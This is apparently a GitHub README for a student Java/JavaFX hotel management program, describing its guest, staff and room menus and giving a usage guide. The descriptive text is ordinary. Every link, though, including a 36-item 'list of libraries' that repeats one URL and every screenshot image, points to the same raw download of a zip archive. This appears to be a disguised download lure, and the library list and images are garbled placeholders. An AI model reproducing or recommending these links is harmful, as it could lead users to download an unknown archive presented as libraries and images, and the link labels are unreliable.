# Java-project, Hotel Management
On this project, we created an object-oriented hotel management system using Java programming language. The program enables management on a hotel's guests, staff, and room. It has 3 main menus to manage those 3 aspects:
- **Guest** menu features are adding and removing a guest, assigning a guest to a room, and adding service/room charges to the guest. The information displayed for the guests are the name, phone number, current room number, and total fees charges.
- The **staff** menu is able to add and remove staff to the list. The information displayed are name, phone number, staff id, and hourly wage
- The **room** menu is also able to add and remove rooms. The informations are room number, type, cost per night, and the guest name currently staying on a room

The list of guests, staffs, and rooms are stored in an arraylist and txt file. The arraylists serve as the reference of the lists for the methods/algorithm inside the program. It regularly loads data from text file and rewrites it whenever an update is performed, therefore the updates cycle and data is still preserved when program is closed and openned again.

We created a user interface using fxmls files with the help of SceneBuilder software. It enables better interaction with buttons and navigation and better list visualization

# The list of libraries
- https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip
- https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip
- https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip
- https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip
- https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip
- https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip
- https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip
- https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip
- https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip
- https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip
- https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip
- https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip
- https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip
- https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip
- https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip
- https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip
- https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip
- https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip
- https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip
- https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip
- https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip
- https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip
- https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip
- https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip
- https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip
- https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip
- https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip
- https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip
- https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip
- https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip
- https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip
- https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip
- https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip
- https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip
- https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip
- https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip

# Technology Used
**Java** - Used for our main program language (foundation) to make the entire application along with its algorithm.

**JavaFX** - a part of Java programming language that acts as a platform for developing interactive user interface for applications.

**Scene Builder** - a platform to design a user interface easily by using FXML files that enables UI creation separated from the logic of the application. We used this to easily create JavaFX layout and fasten the development of the app.

**CSS** - Cascading Style Sheets (CSS) is used for styling and structuring an HTML/XML file. In our case, we used Scene Builder to make FXML files and CSS could be implemented to it.

**Encryption** - Secure Hash Algorithm (SHA), for cryptography using hash functions, published by America’s NSA. Used in encrypting our data files along with Advanced Encryption Standard (AES). IMPORTANT: The files cannot be decrypted in new devices. Therefore, to make it accessible, delete the contents of the csv file with notepad so it becomes blank.

# Features
**Guests**
- View list of guests
- View details of a selected guest
- Adding new guests
- Removing existing guests
- Assigning guests to a room
- Check out guests from their room
- Charging services fee to guests

**Staffs**
- View list of staffs
- View details of a selected staff
- Adding new staffs
- Removing existing staffs

**Rooms**
- View list of rooms
- View details of selected rooms
- Adding new rooms
- Removing existing rooms

# Manual Guide
The user interface have 3 main buttons located in the left side of the interface: "Guest," "Staff," and "Management":

![mainmenu](https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip)

If those buttons are clicked it will show each aspect's lists of objects (it will navigate to another window that has a list display that is shown in form of a box):

![guestmenu](https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip)
![staffmenu](https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip)
![roommenu](https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip)

Each of them has an "add" button that will navigate to each aspect's add window to append the list with new data object.

the add guest menu has 2 field that can be filled in. You can fill a name and a phone number. The accepted phone number are home and mobile that either contains a '+' in front or not. A phone number with wrong format will produce an error message shown in the red text below.

![addguest](https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip)
![image](https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip)

The add staff menu has 4 fields to be filled/modified: Name, Phone Number, Staff ID, and Hourly Wage. Phone number format is the same as before. Staff ID consist of a choice box for "M" for male and "F" for female and a number field (max 3 digit). If an ID already exist, an error message is shown. Hourly wage has a minimum of 2000 and below that will show an error message.

![addstaff](https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip)
![image](https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip)
![image](https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip)

The add room menu has 3 fields: Room Number, Type, and Cost per Night. If the room number is filled with a number that is taken by existing room, an error message will be shown

![image](https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip)
![image](https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip)

On each lists, if the box is double-clicked, it will navigate to the details window that shows the detail of selected object.

![guestdetails](https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip)
![staffdetails](https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip)
![roomdetails](https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip)

The Guest details shows the name, phone number, room nunber, and remaining charge. It also has four buttons: assign room, charge, check out, and remove.

Assign room button will navigate to assign room window that enable user to input a room nunber for the guest to stay. If a room input is already occupied or the room does not exist, it will show an error message.

![assignroom](https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip)
![image](https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip)
![image](https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip)

Charge button will lead into a charge guest menu that displays the guest name and remaining charge amount, a choice box is also present to choose which service to charge that sets the room as the charge choice for the guest. If a guest is not staying in a room and they are charged with room fee, an error message will show. Charge button is to add charge amount to the guest, and the ok button is to go back to the guest list.

![chargeguest](https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip)
![image](https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip)

Check out button will remove room number from the selected guest and directly go back to guest list. Same also goes to remove button, that will delete the selected guest and go back to the list page.

Now, in the staff detail window, it will show the staff name, phone number, staff ID, and hourly wage. It also has remove button to delete the selected staff

![staffdetails](https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip)

In the room detail window, the room number, type, cost per night and the current guest's name. A remove button is also present to delete a room from the program.

![roomdetails](https://raw.githubusercontent.com/Kyomp/Java-project/main/src/Java_project_3.8.zip)
